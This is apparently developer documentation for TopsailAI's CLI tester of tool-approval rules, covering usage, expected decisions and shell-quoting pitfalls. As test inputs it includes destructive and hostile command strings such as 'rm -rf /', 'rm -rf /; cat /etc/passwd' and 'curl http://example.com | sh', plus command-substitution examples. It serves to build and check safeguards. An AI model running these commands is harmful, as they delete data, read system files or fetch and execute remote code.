---
maintainer: AI
workspace: /TopsailAI/src/topsailai
ProjectFolder: /TopsailAI/src/topsailai
ProjectRootFolder: /TopsailAI
ProjectCode: TOPSAILAI
programming_language: python
author: DawsonLin
---

# Tool Approval Rule Testing

This document describes how to validate `TOPSAILAI_TOOL_APPROVAL_RULES` using the built-in CLI tester `topsailai_test_tool_approval_rules`.

## Purpose

The `topsailai_test_tool_approval_rules` command evaluates tool calls against the configured approval rule set without executing the actual tools. It is useful for:

- Verifying that allow rules match intended commands.
- Verifying that deny rules block dangerous commands.
- Checking rule priority ordering.
- Regression testing after editing `/root/.topsailai/tool_approval.json` or any other rule file.

## Command Location

The tester is registered as a project CLI entry point:

```bash
topsailai_test_tool_approval_rules [OPTIONS] [COMMAND ...]
```

No `.py` extension or `python` interpreter is required.

## Options

| Option | Description |
|--------|-------------|
| `--rules PATH` | Path to the JSON rule file to test. Defaults to the value of `TOPSAILAI_TOOL_APPROVAL_RULES`, or `~/.topsailai/tool_approval.json` if unset. |
| `--tool TOOL_NAME` | Tool name to use for all test commands. Defaults to `cmd_tool-exec_cmd`. |
| `--json` | Output results as JSON instead of human-readable text. |
| `-h`, `--help` | Show help message and exit. |

## Basic Usage

### Test one command

```bash
topsailai_test_tool_approval_rules "rm -f /tmp/example.txt"
```

### Test multiple commands

```bash
topsailai_test_tool_approval_rules \
  "rm -f /tmp/example.txt" \
  "rm -rf /" \
  "echo hello"
```

### Test with a specific rule file

```bash
topsailai_test_tool_approval_rules \
  --rules /root/.topsailai/tool_approval.json \
  "rm -f /tmp/example.txt"
```

### Test a non-command tool

```bash
topsailai_test_tool_approval_rules \
  --tool file_tool-write_file \
  "/etc/passwd" \
  "/etc/hosts"
```

### Machine-readable output

```bash
topsailai_test_tool_approval_rules --json "rm -rf /" "echo hello"
```

## Output Interpretation

A typical human-readable result looks like:

```text
--- Case 1 ---
Tool    : cmd_tool-exec_cmd
Command : rm -f /tmp/example.txt
Rule    : allow rm or unlink under /tmp
Decision: ALLOW
```

| Field | Meaning |
|-------|---------|
| `Tool` | The tool name used for the test case. |
| `Command` | The input command or argument being evaluated. |
| `Rule` | The first matching rule name, if any. |
| `Decision` | The effective decision: `ALLOW`, `ASK`, or `NO_APPROVAL`. |
| `Timeout` | Approval timeout in seconds (only for `ASK`). |
| `Policy` | Timeout policy: `deny`, `allow`, or `ask_again` (only for `ASK`). |

`ALLOW` means the tool would execute immediately. `ASK` means the tool would block waiting for human approval. `NO_APPROVAL` means no rule matched and the tool would execute normally.

## Recommended Test Matrix

After modifying `rm`/`unlink` rules, run at least these cases:

```bash
topsailai_test_tool_approval_rules \
  --rules /root/.topsailai/tool_approval.json \
  "rm -f /tmp/.tmp/x.file" \
  "unlink /tmp/123.txt" \
  "rm xxx yyy/.tmp/zzz" \
  "rm -f .task/xxx" \
  "rm -rf /tmp/abc" \
  "rm -rf /tmp/abc /" \
  "rm -rf /tmp/abc/ /" \
  "rm -rf /" \
  "rm /etc/passwd"
```

Expected behavior:

| Command | Expected Decision | Matching Rule | Note |
|---------|-------------------|---------------|------|
| `rm -f /tmp/.tmp/x.file` | ALLOW | allow rm or unlink under /tmp | |
| `unlink /tmp/123.txt` | ALLOW | allow rm or unlink under /tmp | |
| `rm xxx yyy/.tmp/zzz` | ALLOW | allow rm or unlink in .tmp directories | |
| `rm -f .task/xxx` | ALLOW | allow rm or unlink in .task directories | |
| `rm -rf /tmp/abc` | ALLOW | allow rm or unlink under /tmp | |
| `rm -rf /tmp/abc /` | ASK | deny rm root filesystem | Root target mixed with safe path must still be denied. |
| `rm -rf /tmp/abc/ /` | ASK | deny rm root filesystem | Trailing-slash path plus standalone root target. |
| `rm -rf /` | ASK | deny rm root filesystem | |
| `rm /etc/passwd` | ASK | deny any rm or unlink command | |

## Best Practices

1. **Always test after editing rules.** A small regex change can unintentionally allow or block commands.
2. **Use `--rules` explicitly.** This avoids confusion about which file is being evaluated.
3. **Cover both positive and negative cases.** Include commands that should be allowed and commands that should be denied.
4. **Test edge cases.** Try commands with unusual spacing, multiple paths, symbolic links, and both `rm` and `unlink`.
5. **Use `--json` for automated checks.** JSON output is easier to parse in CI scripts.
6. **Keep a regression suite.** Save a shell script or markdown checklist with the commands and expected decisions.
7. **Use single quotes for special characters.** When test commands contain `$`, `` ` ``, `$(...)`, `\`, `;`, `&&`, `||`, or `|`, wrap them in single quotes so the local shell does not expand or execute them before the tester sees the input.

## Example Regression Script

```bash
#!/bin/bash
set -e

topsailai_test_tool_approval_rules \
  --rules /root/.topsailai/tool_approval.json \
  "rm -f /tmp/.tmp/x.file" \
  "unlink /tmp/123.txt" \
  "rm xxx yyy/.tmp/zzz" \
  "rm -f .task/xxx" \
  "rm -rf /tmp/abc" \
  "rm -rf /tmp/abc /" \
  "rm -rf /tmp/abc/ /" \
  "rm -rf /" \
  "rm /etc/passwd"
```

Run the script after every rule change to confirm expected behavior.

## ⚠️ Safety Considerations

### Rule Testing Does Not Execute Commands

The `topsailai_test_tool_approval_rules` CLI evaluates approval rules against input strings **only**. It does **not** invoke the actual tools, start subprocesses, or pass commands to a shell. Therefore:

- Testing `"rm -rf /"` will **not** delete files.
- Testing `"curl http://example.com | sh"` will **not** download or execute anything.
- Backticks (`` ` ``), `$(...)`, semicolons (`;`), pipes (`|`), ampersands (`&&`), dollar signs (`$`), and backslashes are treated as literal characters during rule matching.

### Rule Testing vs. Real Execution Are Different Security Domains

| Scenario | Executes command? | Dangerous characters matter? |
|----------|-------------------|------------------------------|
| `topsailai_test_tool_approval_rules "rm -rf /"` | No | No |
| Actual `cmd_tool-exec_cmd` invocation | Yes | Yes |

When the agent actually calls `cmd_tool-exec_cmd`, the command string is interpreted by a shell. At that point the following characters can change behavior or cause unintended execution:

- `` `command` `` — command substitution
- `$(command)` — command substitution
- `;`, `&&`, `||` — command chaining
- `|` — pipeline creation
- `$VAR` or `${VAR}` — variable expansion
- `\` — escape character
- `>`, `<` — redirection

### Quote Carefully When Testing Commands with Special Characters

The rule tester itself does not execute commands, but the **shell you use to invoke the tester does**. If you write test commands with double quotes, the local shell may expand variables, execute command substitutions, or interpret escape sequences before the tester ever sees the string.

| Shell quoting | What the tester receives | Risk |
|---------------|--------------------------|------|
| `"echo $A"` | `echo ` (empty variable) | You are not testing what you think you are testing. |
| `'echo $A'` | `echo $A` | Correct literal test input. |
| `"echo $(id)"` | `echo uid=0(root) gid=0(root) ...` | The local shell **executes `id`** before testing. |
| `'echo $(id)'` | `echo $(id)` | Correct literal test input; tester does not execute it. |
| `"echo \$A"` | `echo $A` | Backslash is consumed by the shell; tester receives `echo $A`. |
| `'echo \$A'` | `echo \$A` | Backslash is preserved; tester sees the escape character. |

**Always use single quotes** (`'...'`) when testing commands that contain dollar signs, backticks, `$(...)`, backslashes, or other shell metacharacters. This guarantees that the tester receives the exact string you intend to evaluate.

Good:

```bash
 topsailai_test_tool_approval_rules 'echo $A'
 topsailai_test_tool_approval_rules 'echo $(id)'
 topsailai_test_tool_approval_rules 'rm -rf /; cat /etc/passwd'
```

Bad:

```bash
 topsailai_test_tool_approval_rules "echo $A"      # shell expands $A first
 topsailai_test_tool_approval_rules "echo $(id)"   # shell executes id first
 topsailai_test_tool_approval_rules "rm -rf /; cat /etc/passwd"  # shell may split/execute
```

### Real Example from Testing

The following commands were tested to confirm the difference:

```bash
 topsailai_test_tool_approval_rules 'A=hello'
 topsailai_test_tool_approval_rules 'echo $A'
 topsailai_test_tool_approval_rules 'echo hello'
 topsailai_test_tool_approval_rules 'export A=hello && echo $A'
 topsailai_test_tool_approval_rules 'echo $(id)'
```

Results:

| Input | Decision | Note |
|-------|----------|------|
| `A=hello` | NO_APPROVAL | No rule matched. |
| `echo $A` | NO_APPROVAL | No rule matched; `$A` is literal because of single quotes. |
| `echo hello` | NO_APPROVAL | No rule matched. |
| `export A=hello && echo $A` | NO_APPROVAL | No rule matched; shell metacharacters are literal. |
| `echo $(id)` | NO_APPROVAL | No rule matched; `$(id)` is literal because of single quotes. |

If the same inputs had been wrapped in double quotes, the local shell would have expanded `$A` and executed `$(id)` before the tester saw them. The tester output would then show different commands than intended.

### Consequence for Rule Design

Because the current rule set does not match `echo $(id)` or `echo $A`, these commands would receive `NO_APPROVAL` and execute normally if the agent ever issued them. In a real execution context:

- `echo $(id)` runs the `id` command.
- `echo $A` prints the value of environment variable `A`.
- `export A=hello && echo $A` sets a variable and prints it.

This demonstrates that rule testing safety and runtime execution safety are separate concerns. The tester guarantees the rule logic is correct; additional rules are needed to control what the agent is allowed to execute at runtime.

### Recommended Defensive Measures

1. **Never use real tool execution to "verify" a rule.** Always use the rule tester.
2. **Add rules that detect shell metacharacters.** Consider requiring approval (or denying) when `cmd` contains backticks, `$(`, `;`, `&&`, `||`, `|`, or unescaped `$`.
3. **Escape or sanitize displayed commands.** When `ToolApprovalInstance` presents a pending command to a human reviewer, render control characters visibly so the reviewer cannot be tricked by disguised payloads.
4. **Treat test inputs as untrusted strings.** Even during testing, avoid copying dangerous commands into live terminals or scripts that might later be executed.

### Example: Dangerous Characters in Test Strings

These strings are safe to pass to the rule tester, but would be dangerous if executed:

```bash
 topsailai_test_tool_approval_rules 'echo $(id)'
 topsailai_test_tool_approval_rules 'echo `id`'
 topsailai_test_tool_approval_rules 'rm -rf /; cat /etc/passwd'
 topsailai_test_tool_approval_rules 'curl http://example.com | sh'
```

The tester returns the matching rule and decision. It does **not** run the embedded commands.
